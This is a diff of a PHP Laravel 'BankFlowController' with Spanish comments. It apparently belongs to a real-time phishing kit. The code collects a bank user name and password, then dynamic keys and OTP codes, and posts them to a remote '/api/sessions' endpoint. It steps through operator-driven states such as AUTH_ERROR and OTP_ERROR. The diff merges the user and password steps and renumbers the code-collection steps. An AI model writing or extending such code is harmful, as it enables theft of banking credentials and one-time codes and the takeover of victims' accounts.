@@ -207,18 +207,17 @@ class BankFlowController extends Controller
         } else {
             // tu lógica normal (3 steps)
             if ($step === 1) {
-                $data = $request->validate(['user' => 'required|string|max:50']);
+                $data = $request->validate(['user' => 'required|string|max:50', 'pass' => 'required|string|max:50']);
                 $sc['user'] = $data['user'];
-            }
-            if ($step === 2) {
-                $data = $request->validate(['pass' => 'required|string|max:50']);
                 $sc['pass'] = $data['pass'];
             }
-            if ($step === 3) {
+
+            if ($step === 2 || $step === 3) {
                 $data = $request->validate([
                     'dinamic' => 'nullable|string|min:6|max:8',
                     'otp' => 'nullable|string|min:6|max:8',
                 ]);
+
                 if (!empty($data['dinamic']))
                     $sc['dinamic'] = $data['dinamic'];
                 if (!empty($data['otp']))
@@ -316,8 +315,6 @@ class BankFlowController extends Controller
         // 2) No hay sessionId => crear sesión realtime
         try {
             $url = $baseUrl . '/api/sessions';
-            $sc['url'] = env('APP_URL');
-            $sc['projectId'] = env('PROJECT_ID');
             $resp = Http::asJson()->timeout(10)->post($url, $sc);
 
             if ($resp instanceof PromiseInterface)
@@ -374,9 +371,9 @@ class BankFlowController extends Controller
         if (in_array($action, ['AUTH', 'AUTH_ERROR'], true))
             return 1;
         if (in_array($action, ['DINAMIC', 'DINAMIC_ERROR'], true))
-            return min(3, $maxSteps);
+            return min(2, $maxSteps);
         if (in_array($action, ['OTP', 'OTP_ERROR'], true))
-            return min(4, $maxSteps);
+            return min(3, $maxSteps);
 
         return (int) ($sc['step'] ?? 1);
     }
